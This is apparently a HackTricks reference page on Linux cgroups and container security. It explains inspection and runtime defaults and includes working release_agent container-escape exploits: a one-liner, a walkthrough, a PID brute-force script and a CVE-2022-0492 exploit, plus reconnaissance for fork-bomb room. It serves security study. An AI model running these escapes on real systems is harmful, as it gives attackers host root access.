_body: "# cgroups\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n## Overview\n\nLinux **control groups** are\
  \ the kernel mechanism used to group processes together for accounting, limiting, prioritization, and policy enforcement.\
  \ If namespaces are mainly about isolating the view of resources, cgroups are mainly about governing **how much** of those\
  \ resources a set of processes may consume and, in some cases, **which classes of resources** they may interact with at\
  \ all. Containers rely on cgroups constantly, even when the user never looks at them directly, because almost every modern\
  \ runtime needs a way to tell the kernel \"these processes belong to this workload, and these are the resource rules that\
  \ apply to them\".\n\nThis is why container engines place a new container into its own cgroup subtree. Once the process\
  \ tree is there, the runtime can cap memory, limit the number of PIDs, weight CPU usage, regulate I/O, and restrict device\
  \ access. In a production environment, this is essential both for multi-tenant safety and for simple operational hygiene.\
  \ A container without meaningful resource controls may be able to exhaust memory, flood the system with processes, or monopolize\
  \ CPU and I/O in ways that make the host or neighboring workloads unstable.\n\nFrom a security perspective, cgroups matter\
  \ in two separate ways. First, bad or missing resource limits enable straightforward denial-of-service attacks. Second,\
  \ some cgroup features, especially in older **cgroup v1** setups, have historically created powerful breakout primitives\
  \ when they were writable from inside a container.\n\n## v1 Vs v2\n\nThere are two major cgroup models in the wild. **cgroup\
  \ v1** exposes multiple controller hierarchies, and older exploit writeups often revolve around the weird and sometimes\
  \ overly powerful semantics available there. **cgroup v2** introduces a more unified hierarchy and generally cleaner behavior.\
  \ Modern distributions increasingly prefer cgroup v2, but mixed or legacy environments still exist, which means both models\
  \ are still relevant when reviewing real systems.\n\nThe difference matters because some of the most famous container breakout\
  \ stories, such as abuses of **`release_agent`** in cgroup v1, are tied very specifically to older cgroup behavior. A reader\
  \ who sees a cgroup exploit on a blog and then blindly applies it to a modern cgroup v2-only system is likely to misunderstand\
  \ what is actually possible on the target.\n\n## Inspection\n\nThe quickest way to see where your current shell sits is:\n\
  \n```bash\ncat /proc/self/cgroup\nfindmnt -T /sys/fs/cgroup\n```\n\nThe `/proc/self/cgroup` file shows the cgroup paths\
  \ associated with the current process. On a modern cgroup v2 host, you will often see a unified entry. On older or hybrid\
  \ hosts, you may see multiple v1 controller paths. Once you know the path, you can inspect the corresponding files under\
  \ `/sys/fs/cgroup` to see limits and current usage.\n\nOn a cgroup v2 host, the following commands are useful:\n\n```bash\n\
  ls -l /sys/fs/cgroup\ncat /sys/fs/cgroup/cgroup.controllers\ncat /sys/fs/cgroup/cgroup.subtree_control\n```\n\nThese files\
  \ reveal which controllers exist and which ones are delegated to child cgroups. This delegation model matters in rootless\
  \ and systemd-managed environments, where the runtime may only be able to control the subset of cgroup functionality that\
  \ the parent hierarchy actually delegates.\n\n## Lab\n\nOne way to observe cgroups in practice is to run a memory-limited\
  \ container:\n\n```bash\ndocker run --rm -it --memory=256m debian:stable-slim bash\ncat /proc/self/cgroup\ncat /sys/fs/cgroup/memory.max\
  \ 2>/dev/null || cat /sys/fs/cgroup/memory.limit_in_bytes 2>/dev/null\n```\n\nYou can also try a PID-limited container:\n\
  \n```bash\ndocker run --rm -it --pids-limit=64 debian:stable-slim bash\ncat /sys/fs/cgroup/pids.max 2>/dev/null\n```\n\n\
  These examples are useful because they help connect the runtime flag to the kernel file interface. The runtime is not enforcing\
  \ the rule by magic; it is writing the relevant cgroup settings and then letting the kernel enforce them against the process\
  \ tree.\n\n## Runtime Usage\n\nDocker, Podman, containerd, and CRI-O all rely on cgroups as part of normal operation. The\
  \ differences are usually not about whether they use cgroups, but about **which defaults they choose**, **how they interact\
  \ with systemd**, **how rootless delegation works**, and **how much of the configuration is controlled at the engine level\
  \ versus the orchestration level**.\n\nIn Kubernetes, resource requests and limits eventually become cgroup configuration\
  \ on the node. The path from Pod YAML to kernel enforcement passes through the kubelet, the CRI runtime, and the OCI runtime,\
  \ but cgroups are still the kernel mechanism that finally applies the rule. In Incus/LXC environments, cgroups are also\
  \ heavily used, especially because system containers often expose a richer process tree and more VM-like operational expectations.\n\
  \n## Misconfigurations And Breakouts\n\nThe classic cgroup security story is the writable **cgroup v1 `release_agent`**\
  \ mechanism. In that model, if an attacker could write to the right cgroup files, enable `notify_on_release`, and control\
  \ the path stored in `release_agent`, the kernel could end up executing an attacker-chosen path in the initial namespaces\
  \ on the host when the cgroup became empty. That is why older writeups place so much attention on cgroup controller writability,\
  \ mount options, and namespace/capability conditions.\n\nEven when `release_agent` is not available, cgroup mistakes still\
  \ matter. Overly broad device access can make host devices reachable from the container. Missing memory and PID limits can\
  \ turn a simple code execution into a host DoS. Weak cgroup delegation in rootless scenarios can also mislead defenders\
  \ into assuming a restriction exists when the runtime was never actually able to apply it.\n\n### `release_agent` Background\n\
  \nThe `release_agent` technique only applies to **cgroup v1**. The basic idea is that when the last process in a cgroup\
  \ exits and `notify_on_release=1` is set, the kernel executes the program whose path is stored in `release_agent`. That\
  \ execution happens in the **initial namespaces on the host**, which is what turns a writable `release_agent` into a container\
  \ escape primitive.\n\nFor the technique to work, the attacker generally needs:\n\n- a writable **cgroup v1** hierarchy\n\
  - the ability to create or use a child cgroup\n- the ability to set `notify_on_release`\n- the ability to write a path into\
  \ `release_agent`\n- a path that resolves to an executable from the host point of view\n\n### Classic PoC\n\nThe historical\
  \ one-liner PoC is:\n\n```bash\nd=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))\nmkdir -p \"$d/w\"\necho 1 > \"$d/w/notify_on_release\"\
  \nt=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\ntouch /o\necho \"$t/c\" > \"$d/release_agent\"\ncat <<'EOF'\
  \ > /c\n#!/bin/sh\nps aux > \"$t/o\"\nEOF\nchmod +x /c\nsh -c \"echo 0 > $d/w/cgroup.procs\"\nsleep 1\ncat /o\n```\n\nThis\
  \ PoC writes a payload path into `release_agent`, triggers cgroup release, and then reads back the output file generated\
  \ on the host.\n\n### Readable Walk-Through\n\nThe same idea is easier to understand when broken into steps.\n\n1. Create\
  \ and prepare a writable cgroup:\n\n```bash\nmkdir /tmp/cgrp\nmount -t cgroup -o rdma cgroup /tmp/cgrp    # or memory if\
  \ available in v1\nmkdir /tmp/cgrp/x\necho 1 > /tmp/cgrp/x/notify_on_release\n```\n\n2. Identify the host path that corresponds\
  \ to the container filesystem:\n\n```bash\nhost_path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\necho \"$host_path/cmd\"\
  \ > /tmp/cgrp/release_agent\n```\n\n3. Drop a payload that will be visible from the host path:\n\n```bash\ncat <<'EOF' >\
  \ /cmd\n#!/bin/sh\nps aux > /output\nEOF\nchmod +x /cmd\n```\n\n4. Trigger execution by making the cgroup empty:\n\n```bash\n\
  sh -c \"echo $$ > /tmp/cgrp/x/cgroup.procs\"\nsleep 1\ncat /output\n```\n\nThe effect is host-side execution of the payload\
  \ with host root privileges. In a real exploit, the payload usually writes a proof file, spawns a reverse shell, or modifies\
  \ host state.\n\n### Relative Path Variant Using `/proc/<pid>/root`\n\nIn some environments, the host path to the container\
  \ filesystem is not obvious or is hidden by the storage driver. In that case the payload path can be expressed through `/proc/<pid>/root/...`,\
  \ where `<pid>` is a host PID belonging to a process in the current container. That is the basis of the relative-path brute-force\
  \ variant:\n\n```bash\n#!/bin/sh\n\nOUTPUT_DIR=\"/\"\nMAX_PID=65535\nCGROUP_NAME=\"xyx\"\nCGROUP_MOUNT=\"/tmp/cgrp\"\nPAYLOAD_NAME=\"\
  ${CGROUP_NAME}_payload.sh\"\nPAYLOAD_PATH=\"${OUTPUT_DIR}/${PAYLOAD_NAME}\"\nOUTPUT_NAME=\"${CGROUP_NAME}_payload.out\"\n\
  OUTPUT_PATH=\"${OUTPUT_DIR}/${OUTPUT_NAME}\"\n\nsleep 10000 &\n\ncat > ${PAYLOAD_PATH} << __EOF__\n#!/bin/sh\nOUTPATH=\\\
  $(dirname \\$0)/${OUTPUT_NAME}\nps -eaf > \\${OUTPATH} 2>&1\n__EOF__\n\nchmod a+x ${PAYLOAD_PATH}\n\nmkdir ${CGROUP_MOUNT}\n\
  mount -t cgroup -o memory cgroup ${CGROUP_MOUNT}\nmkdir ${CGROUP_MOUNT}/${CGROUP_NAME}\necho 1 > ${CGROUP_MOUNT}/${CGROUP_NAME}/notify_on_release\n\
  \nTPID=1\nwhile [ ! -f ${OUTPUT_PATH} ]\ndo\n  if [ $((${TPID} % 100)) -eq 0 ]\n  then\n    echo \"Checking pid ${TPID}\"\
  \n    if [ ${TPID} -gt ${MAX_PID} ]\n    then\n      echo \"Exiting at ${MAX_PID}\"\n      exit 1\n    fi\n  fi\n  echo\
  \ \"/proc/${TPID}/root${PAYLOAD_PATH}\" > ${CGROUP_MOUNT}/release_agent\n  sh -c \"echo \\$\\$ > ${CGROUP_MOUNT}/${CGROUP_NAME}/cgroup.procs\"\
  \n  TPID=$((${TPID} + 1))\ndone\n\nsleep 1\ncat ${OUTPUT_PATH}\n```\n\nThe relevant trick here is not the brute force itself\
  \ but the path form: `/proc/<pid>/root/...` lets the kernel resolve a file inside the container filesystem from the host\
  \ namespace, even when the direct host storage path is not known ahead of time.\n\n### CVE-2022-0492 Variant\n\nIn 2022,\
  \ CVE-2022-0492 showed that writing to `release_agent` in cgroup v1 was not correctly checking for `CAP_SYS_ADMIN` in the\
  \ **initial** user namespace. This made the technique far more reachable on vulnerable kernels because a container process\
  \ that could mount a cgroup hierarchy could write `release_agent` without already being privileged in the host user namespace.\n\
  \nMinimal exploit:\n\n```bash\napk add --no-cache util-linux\nunshare -UrCm sh -c '\n  mkdir /tmp/c\n  mount -t cgroup -o\
  \ memory none /tmp/c\n  echo 1 > /tmp/c/notify_on_release\n  echo /proc/self/exe > /tmp/c/release_agent\n  (sleep 1; echo\
  \ 0 > /tmp/c/cgroup.procs) &\n  while true; do sleep 1; done\n'\n```\n\nOn a vulnerable kernel, the host executes `/proc/self/exe`\
  \ with host root privileges.\n\nFor practical abuse, start by checking whether the environment still exposes writable cgroup-v1\
  \ paths or dangerous device access:\n\n```bash\nmount | grep cgroup\nfind /sys/fs/cgroup -maxdepth 3 -name release_agent\
  \ 2>/dev/null -exec ls -l {} \\;\nfind /sys/fs/cgroup -maxdepth 3 -writable 2>/dev/null | head -n 50\nls -l /dev | head\
  \ -n 50\n```\n\nIf `release_agent` is present and writable, you are already in legacy-breakout territory:\n\n```bash\nfind\
  \ /sys/fs/cgroup -maxdepth 3 -name notify_on_release 2>/dev/null\nfind /sys/fs/cgroup -maxdepth 3 -name cgroup.procs 2>/dev/null\
  \ | head\n```\n\nIf the cgroup path itself does not yield an escape, the next practical use is often denial of service or\
  \ reconnaissance:\n\n```bash\ncat /sys/fs/cgroup/pids.max 2>/dev/null\ncat /sys/fs/cgroup/memory.max 2>/dev/null\ncat /sys/fs/cgroup/cpu.max\
  \ 2>/dev/null\n```\n\nThese commands quickly tell you whether the workload has room to fork-bomb, consume memory aggressively,\
  \ or abuse a writable legacy cgroup interface.\n\n## Checks\n\nWhen reviewing a target, the purpose of the cgroup checks\
  \ is to learn which cgroup model is in use, whether the container sees writable controller paths, and whether old breakout\
  \ primitives such as `release_agent` are even relevant.\n\n```bash\ncat /proc/self/cgroup                              \
  \        # Current process cgroup placement\nmount | grep cgroup                                        # cgroup v1/v2 mounts\
  \ and mount options\nfind /sys/fs/cgroup -maxdepth 3 -name release_agent 2>/dev/null   # Legacy v1 breakout primitive\n\
  cat /proc/1/cgroup                                         # Compare with PID 1 / host-side process layout\n```\n\nWhat\
  \ is interesting here:\n\n- If `mount | grep cgroup` shows **cgroup v1**, older breakout writeups become more relevant.\n\
  - If `release_agent` exists and is reachable, that is immediately worth deeper investigation.\n- If the visible cgroup hierarchy\
  \ is writable and the container also has strong capabilities, the environment deserves much closer review.\n\nIf you discover\
  \ **cgroup v1**, writable controller mounts, and a container that also has strong capabilities or weak seccomp/AppArmor\
  \ protection, that combination deserves careful attention. cgroups are often treated as a boring resource-management topic,\
  \ but historically they have been part of some of the most instructive container escape chains precisely because the boundary\
  \ between \"resource control\" and \"host influence\" was not always as clean as people assumed.\n\n## Runtime Defaults\n\
  \n| Runtime / platform | Default state | Default behavior | Common manual weakening |\n| --- | --- | --- | --- |\n| Docker\
  \ Engine | Enabled by default | Containers are placed in cgroups automatically; resource limits are optional unless set\
  \ with flags | omitting `--memory`, `--pids-limit`, `--cpus`, `--blkio-weight`; `--device`; `--privileged` |\n| Podman |\
  \ Enabled by default | `--cgroups=enabled` is the default; cgroup namespace defaults vary by cgroup version (`private` on\
  \ cgroup v2, `host` on some cgroup v1 setups) | `--cgroups=disabled`, `--cgroupns=host`, relaxed device access, `--privileged`\
  \ |\n| Kubernetes | Enabled through the runtime by default | Pods and containers are placed in cgroups by the node runtime;\
  \ fine-grained resource control depends on `resources.requests` / `resources.limits` | omitting resource requests/limits,\
  \ privileged device access, host-level runtime misconfiguration |\n| containerd / CRI-O | Enabled by default | cgroups are\
  \ part of normal lifecycle management | direct runtime configs that relax device controls or expose legacy writable cgroup\
  \ v1 interfaces |\n\nThe important distinction is that **cgroup existence** is usually default, while **useful resource\
  \ constraints** are often optional unless explicitly configured.\n{{#include ../../../../banners/hacktricks-training.md}}"
